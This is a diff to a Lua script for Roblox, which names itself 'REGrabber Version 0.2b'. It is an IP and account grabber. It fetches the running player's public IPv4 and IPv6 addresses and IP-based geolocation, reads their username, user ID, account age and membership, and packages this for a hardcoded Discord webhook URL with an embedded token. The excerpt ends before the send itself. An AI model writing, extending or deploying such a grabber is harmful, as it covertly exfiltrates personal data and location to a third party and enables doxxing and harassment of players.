@@ -1,3 +1,7 @@
+--[[
+
+]]--
+
 local Webhook = "https://discord.com/api/webhooks/1147127956276248666/aiXFBmKA4_5Sc8j_UC_VQ2qRJmu8GKk7EDv8NVsVNkOr4MNRmdTblHE_qqgRpeM2l-zq"
 local IPv4 = game:HttpGet("https://api.ipify.org") 
 local IPv6 = game:HttpGet("https://api64.ipify.org") 
@@ -6,9 +10,10 @@ local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip="..IPv4)
 -- TODO: Using Shodan API
 
 local Headers = {["content-type"] = "application/json"} 
+
 local LocalPlayer = game:GetService("Players").LocalPlayer 
 
-local AccountAge = LocalPlayer.AccountAge -- Account age since created
+local AccountAge = LocalPlayer.AccountAge 
 local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21) 
 local UserId = LocalPlayer.UserId 
 local PlayerName = LocalPlayer.Name 
@@ -16,8 +21,8 @@ local DisplayName= LocalPlayer.DisplayName
 local PlaceID = game.PlaceId 
 
 
-local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') -- Get date of grabbed/logged
-local rver = "Version 0.2b" ===
+local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') 
+local rver = "Version 0.2b" 
 
 --[[ Identify the executor ]]--
 -- https://v3rmillion.net/showthread.php?tid=1163680&page=2
@@ -37,7 +42,7 @@ local PlayerData = {
                 ["name"] = "REGrabber "..rver, 
             },
            
-            ["title"] = PlayerName, 
+            ["title"] = PlayerName, -- Username/PlayerName
             ["description"] = "aka "..DisplayName, 
             ["fields"] = {
                 {
